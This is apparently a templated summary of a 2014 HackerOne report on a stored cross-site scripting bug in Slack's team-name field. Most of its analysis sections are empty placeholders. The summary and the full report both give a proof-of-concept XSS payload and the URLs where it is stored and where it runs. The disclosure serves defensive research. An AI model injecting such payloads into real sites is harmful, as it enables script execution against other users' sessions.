# a stored xss in  slack integration  https://onerror.slack.com/services/import

## Metadata
- **Source:** HackerOne
- **Report:** 33018 | https://hackerone.com/reports/33018
- **Submitted:** 2014-10-28
- **Reporter:** securitythinker
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
location of the stored xss bug :
https://hunter22.slack.com/admin/name
in team name :put this payload :"><img src=x onerror=prompt(document.domain)>

stored xss executed here:
https://hunter22.slack.com/services/import

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

location of the stored xss bug :
https://hunter22.slack.com/admin/name
in team name :put this payload :"><img src=x onerror=prompt(document.domain)>

stored xss executed here:
https://hunter22.slack.com/services/import

</details>

---
*Analysed by Claude on 2026-05-24*
